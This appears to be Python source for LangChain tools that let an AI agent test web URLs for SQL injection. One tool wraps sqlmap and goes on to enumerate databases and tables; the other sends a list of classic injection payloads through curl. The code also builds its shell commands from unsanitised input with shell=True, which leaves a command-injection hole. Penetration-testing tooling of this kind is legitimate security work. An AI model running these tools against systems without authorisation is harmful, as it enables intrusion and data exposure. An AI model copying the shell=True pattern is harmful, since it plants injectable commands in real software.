"""
SQL Injection tester - uses sqlmap for accurate SQLi detection
Only reports confirmed vulnerabilities with proper verification
"""
from langchain.tools import tool
import subprocess
import os
import re
import json
import urllib.parse
from urllib.parse import urlparse, parse_qs


@tool()
def test_sqli(url: str, parameter: str = "", method: str = "GET", post_data: str = "", cookie: str = "") -> str:
    """
    Test for SQL injection vulnerabilities using sqlmap.
    Only reports CONFIRMED vulnerabilities with database verification.
    
    Args:
        url: Target URL to test
        parameter: Specific parameter to test (optional, tests all if not specified)
        method: HTTP method - GET or POST (default: GET)
        post_data: POST data in format "param1=val1&param2=val2" (only for POST)
        cookie: Cookie header if authentication required
    
    Returns:
        Detailed report of confirmed SQL injection vulnerabilities ONLY
    
    Example:
        test_sqli(url="http://example.com/product?id=1", parameter="id")
        test_sqli(url="http://example.com/login", method="POST", post_data="username=test&password=test")
    """
    
    print(f"[*] SQLi Testing with sqlmap: {url}")
    
    # Check if sqlmap is installed
    if not os.path.exists('/usr/bin/sqlmap') and not os.path.exists('/usr/local/bin/sqlmap'):
        return "[-] sqlmap not installed. Install with: sudo apt install sqlmap"
    
    results = []
    vulnerabilities_found = []
    
    # Build sqlmap command
    cmd_parts = [
        'sqlmap',
        '-u', f'"{url}"',
        '--batch',  # Non-interactive
        '--random-agent',  # Random user agent
        '--level=2',  # More thorough testing
        '--risk=2',  # Moderate risk tests
        '--threads=5',  # Parallel threads
        '--technique=BEUSTQ',  # All techniques: Boolean, Error, Union, Stacked, Time, Query
        '--fresh-queries',  # Ignore cached results
        '--flush-session',  # Clear session
    ]
    
    # Add parameter specification if provided
    if parameter:
        cmd_parts.extend(['-p', f'"{parameter}"'])
    
    # Add POST data if provided
    if method.upper() == 'POST' and post_data:
        cmd_parts.extend(['--data', f'"{post_data}"'])
    
    # Add cookie if provided
    if cookie:
        cmd_parts.extend(['--cookie', f'"{cookie}"'])
    
    # First pass: Check for vulnerability
    cmd = ' '.join(cmd_parts)
    
    try:
        print(f"  Running: sqlmap vulnerability detection...")
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=120  # 2 minute timeout
        )
        
        output = result.stdout + result.stderr
        
        # Parse sqlmap output for vulnerabilities
        if 'is vulnerable' in output.lower() or 'parameter appears to be' in output.lower():
            # Extract injection details
            injection_types = []
            
            if re.search(r'Type:\s*(\w+)', output):
                injection_types = re.findall(r'Type:\s*(\w+)', output)
            
            if re.search(r'Title:\s*(.+)', output):
                titles = re.findall(r'Title:\s*(.+)', output)
            
            if re.search(r'Payload:\s*(.+)', output):
                payloads = re.findall(r'Payload:\s*(.+)', output)
            
            # VERIFICATION STEP: Try to enumerate database to confirm
            verify_cmd = cmd + ' --dbs --timeout=30'
            
            print(f"  [VERIFY] Attempting database enumeration to confirm...")
            verify_result = subprocess.run(
                verify_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=90
            )
            
            verify_output = verify_result.stdout + verify_result.stderr
            
            # Check if database enumeration succeeded
            databases_found = []
            if 'available databases' in verify_output.lower():
                # Extract database names
                db_match = re.search(r'available databases \[\d+\]:(.*?)(?:\[|\Z)', verify_output, re.DOTALL | re.IGNORECASE)
                if db_match:
                    db_lines = db_match.group(1).strip()
                    databases_found = re.findall(r'\[\*\]\s+(\w+)', db_lines)
            
            # Only report if we can actually confirm database access
            if databases_found:
                vulnerability = {
                    'parameter': parameter or 'auto-detected',
                    'url': url,
                    'injection_types': injection_types,
                    'databases_enumerated': databases_found[:5],  # First 5 databases
                    'confirmation': 'VERIFIED - Database enumeration successful',
                    'severity': 'CRITICAL'
                }
                vulnerabilities_found.append(vulnerability)
                
                results.append(f"\n{'='*60}")
                results.append(f"[!] CONFIRMED SQL INJECTION VULNERABILITY")
                results.append(f"{'='*60}")
                results.append(f"URL: {url}")
                results.append(f"Parameter: {parameter or 'auto-detected'}")
                results.append(f"Injection Types: {', '.join(injection_types)}")
                results.append(f"Databases Found: {', '.join(databases_found[:5])}")
                results.append(f"Verification: DATABASE ENUMERATION SUCCESSFUL")
                results.append(f"Severity: CRITICAL")
                results.append(f"{'='*60}\n")
                
                # Try to get table information from first database
                if databases_found:
                    first_db = databases_found[0]
                    table_cmd = cmd + f' -D "{first_db}" --tables --timeout=30'
                    
                    print(f"  [VERIFY] Enumerating tables in {first_db}...")
                    table_result = subprocess.run(
                        table_cmd,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=60
                    )
                    
                    table_output = table_result.stdout + table_result.stderr
                    
                    if 'Database: ' + first_db in table_output:
                        tables = re.findall(r'\[\*\]\s+(\w+)', table_output)
                        if tables:
                            results.append(f"[+] Tables in {first_db}: {', '.join(tables[:10])}")
                            vulnerability['tables_enumerated'] = tables[:10]
            else:
                # SQLi detected but can't enumerate database - possible false positive
                results.append(f"[~] SQLi indicators found but database enumeration FAILED")
                results.append(f"    This may be a false positive or WAF is blocking enumeration")
                results.append(f"    Not reporting as confirmed vulnerability")
                results.append(f"    Output snippet: {output[:200]}")
        
        else:
            results.append(f"✓ No SQL injection detected in {url}")
            if parameter:
                results.append(f"  Parameter tested: {parameter}")
    
    except subprocess.TimeoutExpired:
        results.append(f"[!] SQLi testing timed out for {url}")
        results.append(f"    Consider manual verification")
    except Exception as e:
        results.append(f"[-] Error during SQLi testing: {e}")
    
    # Build final report
    summary = []
    summary.append(f"SQL Injection Testing Report")
    summary.append(f"{'='*60}")
    summary.append(f"Target: {url}")
    summary.append(f"Method: {method}")
    summary.append(f"Parameter: {parameter or 'all parameters'}")
    summary.append(f"Confirmed Vulnerabilities: {len(vulnerabilities_found)}")
    summary.append(f"{'='*60}\n")
    
    if vulnerabilities_found:
        summary.append(f"[!] CRITICAL: {len(vulnerabilities_found)} CONFIRMED SQL INJECTION(S)")
        summary.append(f"")
        for vuln in vulnerabilities_found:
            summary.append(f"✗ SQLi in: {vuln['parameter']}")
            summary.append(f"  Types: {', '.join(vuln['injection_types'])}")
            summary.append(f"  Databases: {', '.join(vuln['databases_enumerated'])}")
            if 'tables_enumerated' in vuln:
                summary.append(f"  Tables: {', '.join(vuln['tables_enumerated'])}")
            summary.append(f"  Severity: {vuln['severity']}")
            summary.append(f"")
        
        summary.append(f"Recommendation: Immediate remediation required!")
        summary.append(f"- Use parameterized queries/prepared statements")
        summary.append(f"- Implement input validation")
        summary.append(f"- Apply principle of least privilege to database user")
    else:
        summary.append(f"✓ No confirmed SQL injection vulnerabilities")
        summary.append(f"  Note: Only reporting verified vulnerabilities with database access")
    
    if results:
        summary.append(f"\nDetailed Results:")
        summary.extend(results)
    
    return '\n'.join(summary)


@tool()
def quick_sqli_check(url: str) -> str:
    """
    Quick SQL injection check using simple payloads.
    Used for initial detection before full sqlmap scan.
    
    Args:
        url: Target URL with parameter to test
    
    Returns:
        Quick check results with error-based detection
    """
    
    print(f"[*] Quick SQLi Check: {url}")
    
    # Simple error-based payloads
    payloads = [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "' UNION SELECT NULL--",
        "' AND 1=1--",
        "' AND 1=2--",
    ]
    
    sql_error_patterns = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"Driver.*SQL[\-\_\ ]*Server",
        r"OLE DB.*SQL Server",
        r"(\W|\A)SQL Server.*Driver",
        r"Warning.*mssql_",
        r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
        r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        r"(?s)Exception.*\WRoadhouse\.Cms\.",
        r"Microsoft OLE DB Provider for ODBC Drivers error",
        r"Error Executing Database Query",
        r"SQLite/JDBCDriver",
        r"SQLite.Exception",
        r"System.Data.SQLite.SQLiteException",
        r"Warning.*sqlite_",
        r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_",
        r"Warning.*\Wora_",
    ]
    
    errors_found = []
    
    for payload in payloads:
        # Inject payload into URL
        if '?' in url:
            test_url = url + urllib.parse.quote(payload)
        else:
            test_url = url + '?id=' + urllib.parse.quote(payload)
        
        try:
            result = subprocess.run(
                ['curl', '-s', '-L', '--max-time', '5', test_url],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            response = result.stdout
            
            # Check for SQL errors
            for pattern in sql_error_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    errors_found.append({
                        'payload': payload,
                        'error_pattern': pattern,
                        'snippet': response[:200]
                    })
                    break
        
        except Exception:
            continue
    
    if errors_found:
        return f"[!] Potential SQLi detected - {len(errors_found)} error-based indicators\n" + \
               f"Recommendation: Run full test_sqli() for confirmation\n" + \
               f"Errors: {[e['payload'] for e in errors_found]}"
    else:
        return "✓ No obvious SQL errors detected in quick check"
